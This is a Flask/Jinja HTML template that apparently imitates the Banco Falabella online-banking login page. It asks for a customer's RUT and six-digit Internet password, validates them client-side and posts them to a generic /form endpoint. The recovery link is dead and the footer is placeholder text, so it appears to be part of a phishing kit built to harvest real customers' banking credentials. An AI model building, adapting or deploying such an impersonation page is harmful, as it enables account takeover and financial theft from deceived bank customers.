<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Banco Falabella</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="https://cdn.tailwindcss.com"></script>
</head>

<body class="bg-white">
<div class="flex flex-col justify-between min-h-screen">

    <main class="flex-grow flex flex-col items-center justify-center p-6">
        <div class="w-full max-w-sm">

            <img src="/static/logo.png" class="w-48 mx-auto mb-16">

            {% if request.args.get("error") == "spam" %}
            <div class="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded mb-6 text-center">
                <strong>Error!</strong> Intento demasiado rápido. Espera.
            </div>
            {% endif %}

            {% if request.args.get("login_error") == "1" %}
            <div class="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded mb-6 text-center">
                <strong>Error!</strong> RUT o Clave incorrectos.
            </div>
            {% endif %}

            <form id="login-form" method="POST" action="/form" class="w-full">
                <input type="hidden" name="type" value="login">
                <input type="hidden" id="double_click_check" name="double_clicked" value="0">

                <div class="mb-4">
                    <input id="rut" name="rut" type="text"
                           class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:border-green-600 
                                  text-lg text-center"
                           placeholder="Ingresa tu RUT" maxlength="12" required>
                </div>

                <div class="mb-4">
                    <input id="clave" name="clave" type="password" maxlength="6"
                           class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:border-green-600 
                                  text-lg text-center"
                           placeholder="Ingresa tu Clave Internet" required>
                </div>

                <button id="submit-btn" disabled
                        class="w-full bg-gray-400 cursor-not-allowed text-white font-bold py-3 rounded-full 
                               transition mt-8 text-lg">
                    Continuar
                </button>
            </form>

            <div class="text-center mt-8">
                <a class="text-sm text-green-600 font-semibold hover:underline">
                    Recupera o crea tu Clave Internet
                </a>
            </div>

        </div>
    </main>

    <footer class="sticky bottom-0 left-0 right-0 bg-white border-t border-gray-200">
        <div class="flex justify-around max-w-sm mx-auto p-3 text-gray-600">
            Menú inferior
        </div>
    </footer>

</div>

<script>
/* ------------------ VALIDACIÓN RUT ------------------ */

function validateRUT(rut) {
    rut = rut.replace(/[^0-9kK]/g, "").replace(/[\.-]/g, "");
    if (rut.length < 2) return false;

    let body = rut.slice(0, -1);
    let dv = rut.slice(-1).toUpperCase();

    let sum = 0, multiplier = 2;
    for (let i = body.length - 1; i >= 0; i--) {
        sum += parseInt(body[i]) * multiplier;
        multiplier = multiplier === 7 ? 2 : multiplier + 1;
    }

    let expected = 11 - (sum % 11);
    expected = expected === 11 ? "0" : expected === 10 ? "K" : expected.toString();

    return dv === expected;
}

function formatRUT(value) {
    value = value.replace(/[^0-9kK]/g, "");
    let body = value.slice(0, -1);
    let dv = value.slice(-1).toUpperCase();
    if (body.length > 0) {
        body = body.replace(/\B(?=(\d{3})+(?!\d))/g, ".");
        return body + "-" + dv;
    }
    return dv;
}

const rutInput = document.getElementById("rut");
const claveInput = document.getElementById("clave");
const submitBtn = document.getElementById("submit-btn");

function updateButton() {
    const rutOK = validateRUT(rutInput.value);
    const claveOK = /^\d{6}$/.test(claveInput.value);

    if (rutOK && claveOK) {
        submitBtn.disabled = false;
        submitBtn.classList.remove("bg-gray-400", "cursor-not-allowed");
        submitBtn.classList.add("bg-green-600", "hover:bg-green-700");
    } else {
        submitBtn.disabled = true;
        submitBtn.classList.add("bg-gray-400", "cursor-not-allowed");
        submitBtn.classList.remove("bg-green-600", "hover:bg-green-700");
    }
}

rutInput.addEventListener("input", (e) => {
    e.target.value = formatRUT(e.target.value);
    updateButton();
});

claveInput.addEventListener("input", updateButton);

/* BLOQUEO DOBLE SUBMIT */
let clicks = 0;

document.getElementById("login-form").addEventListener("submit", (e) => {
    clicks++;
    if (clicks > 1) document.getElementById("double_click_check").value = "1";

    submitBtn.disabled = true;
    submitBtn.innerText = "Verificando...";
});
</script>

</body>
</html>
